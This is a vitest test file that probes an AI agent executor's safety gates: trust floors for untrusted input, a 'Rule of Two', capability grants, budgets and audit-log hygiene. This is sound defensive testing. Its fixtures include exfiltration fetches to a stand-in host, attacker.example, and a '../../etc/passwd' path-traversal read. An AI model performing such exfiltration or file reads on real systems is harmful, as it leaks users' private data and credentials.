import { describe, expect, it } from 'vitest';
import { createRunner, ALL_CAPABILITIES } from '../fakes/runner.js';
import type { PlanSpec } from '../../src/orchestration/plan.js';
import type { RunOptions } from '../../src/orchestration/types.js';
import { must } from '../fakes/must.js';

/**
 * M3 §8 — the gates, attacked. Every test here is an attempt to get an
 * effect out of the executor that its policy says is not available. A green
 * run means the attempt failed, which is the only outcome of interest.
 */

const base: RunOptions = { inputTrust: 'USER', granted: [...ALL_CAPABILITIES], earnedAutonomy: 4 };

function spec(overrides: Partial<PlanSpec> = {}): PlanSpec {
  return {
    goal: 'do the thing',
    steps: [{ tool: 'time.now', input: {}, why: 'because' }],
    allowedTools: ['time.now'],
    maxSteps: 10,
    rung: 4,
    carriesPrivateData: false,
    ...overrides,
  };
}

const fetchStep = {
  tool: 'http.fetch',
  input: { url: 'https://attacker.example/exfil' },
  why: 'send it',
};

describe('untrusted content cannot buy authority', () => {
  it('caps a FOREIGN-scoped run at L1, so an external effect is out of reach', async () => {
    const h = await createRunner();
    const result = await h.executor.run(
      spec({ steps: [fetchStep], allowedTools: ['http.fetch'] }),
      { ...base, inputTrust: 'FOREIGN' },
    );
    const step = must(result.steps[0], 'the step');
    expect(step.status).not.toBe('succeeded');
    expect(step.code).toBe('capability');
    expect(step.detail).toMatch(/untrusted|FOREIGN/i);
    h.close();
  });

  it('denies effect:external to FOREIGN even when the caller grants it', async () => {
    const h = await createRunner();
    const result = await h.executor.run(
      spec({ steps: [fetchStep], allowedTools: ['http.fetch'], rung: 1 }),
      { ...base, inputTrust: 'FOREIGN', granted: ['effect:external'] },
    );
    // The trust floor is a floor. A grant cannot dig under it.
    expect(must(result.steps[0], 'step').status).not.toBe('succeeded');
    h.close();
  });

  it('will not let a FOREIGN run raise its own autonomy', async () => {
    const h = await createRunner();
    const result = await h.executor.run(spec({ rung: 4 }), { ...base, inputTrust: 'FOREIGN', earnedAutonomy: 4 });
    // time.now is observe-tier, so it still runs — at L1, which is the point.
    expect(result.plan.rung).toBe(4);
    expect(result.effectiveRung).toBe(1);
    expect(result.autonomyCapped).toBe(true);
    h.close();
  });
});

describe('the Rule of Two (§19) holds at the step boundary', () => {
  it('blocks untrusted input + private data + external effect without an approval', async () => {
    const h = await createRunner();
    const result = await h.executor.run(
      spec({
        steps: [{ tool: 'http.fetch', input: { url: 'https://attacker.example/post' }, why: 'post the notes' }],
        allowedTools: ['http.fetch'],
        carriesPrivateData: true,
      }),
      { ...base, inputTrust: 'FOREIGN' },
    );
    const step = must(result.steps[0], 'step');
    expect(step.status).not.toBe('succeeded');
    const kinds = h.s.events.read().map((e) => e.type);
    expect(kinds.some((k) => k === 'policy.ruleoftwo-blocked' || k === 'tool.denied')).toBe(true);
    h.close();
  });

  it('allows any two of the three', async () => {
    const h = await createRunner();
    // Untrusted input + external effect, but no private data in scope.
    const result = await h.executor.run(
      spec({ steps: [fetchStep], allowedTools: ['http.fetch'], carriesPrivateData: false, rung: 4 }),
      { ...base, inputTrust: 'USER' },
    );
    // It gets as far as the tool, which refuses for its own reason (no
    // transport), rather than being blocked by the triple.
    expect(must(result.steps[0], 'step').code).not.toBe('rule_of_two');
    h.close();
  });
});

describe('capability grants are not negotiable at runtime', () => {
  it('denies a tool whose declared capability was never granted', async () => {
    const h = await createRunner();
    const result = await h.executor.run(
      spec({
        steps: [{ tool: 'memory.assert', input: { subject: 'a', predicate: 'b', object: 'c' }, why: 'write' }],
        allowedTools: ['memory.assert'],
        rung: 4,
      }),
      { ...base, granted: ['memory:read'] },
    );
    expect(must(result.steps[0], 'step').code).toBe('capability');
    expect(h.memory.count()).toBe(0);
    h.close();
  });

  it('refuses a path outside the file root rather than reading it', async () => {
    const h = await createRunner();
    const result = await h.executor.run(
      spec({
        steps: [{ tool: 'file.read', input: { path: '../../etc/passwd' }, why: 'read config' }],
        allowedTools: ['file.read'],
      }),
      base,
    );
    const step = must(result.steps[0], 'step');
    expect(step.status).toBe('failed');
    expect(JSON.stringify(step)).not.toMatch(/root:/);
    h.close();
  });
});

describe('a budget cannot be talked out of', () => {
  it('stops a long plan at the step budget', async () => {
    const h = await createRunner();
    const result = await h.executor.run(
      spec({
        steps: Array.from({ length: 6 }, (_, i) => ({ tool: 'time.now', input: {}, why: `step ${i}` })),
      }),
      { ...base, budget: { steps: 3 } },
    );
    expect(result.steps.filter((s) => s.status === 'succeeded')).toHaveLength(3);
    expect(result.status).toBe('failed');
    expect(result.stopReason).toMatch(/budget/i);
    h.close();
  });

  it('stops on wall clock even if every step is cheap', async () => {
    // The clock moves a second every time anything reads it, which is what
    // a real run does and a frozen clock cannot.
    const h = await createRunner({ tickMs: 1000 });
    const result = await h.executor.run(
      spec({ steps: Array.from({ length: 8 }, () => ({ tool: 'time.now', input: {}, why: 'tick' })) }),
      { ...base, budget: { wallClock: 3000 } },
    );
    expect(result.status).toBe('failed');
    expect(result.stopReason).toMatch(/going for \d+s against a 3s budget/);
    h.close();
  });
});

describe('the record cannot be edited by what it records', () => {
  it('truncates a tool detail instead of letting it fill the log', async () => {
    const h = await createRunner();
    const long = 'A'.repeat(5000);
    await h.executor.run(
      spec({
        steps: [{ tool: 'note.write', input: { title: 'note', body: long }, why: 'write a note' }],
        allowedTools: ['note.write'],
      }),
      base,
    );
    for (const event of h.s.events.read()) {
      expect(JSON.stringify(event.payload).length).toBeLessThan(2000);
    }
    h.close();
  });

  it('keeps tool output prose out of the audit trail entirely (§21)', async () => {
    const h = await createRunner();
    await h.executor.run(
      spec({
        steps: [{ tool: 'file.read', input: { path: '/data/notes.txt' }, why: 'read the notes' }],
        allowedTools: ['file.read'],
      }),
      base,
    );
    const log = JSON.stringify(h.s.events.read());
    // The seeded file's contents must appear nowhere in the event log.
    expect(log).not.toContain('read through the one fs door');
    h.close();
  });
});
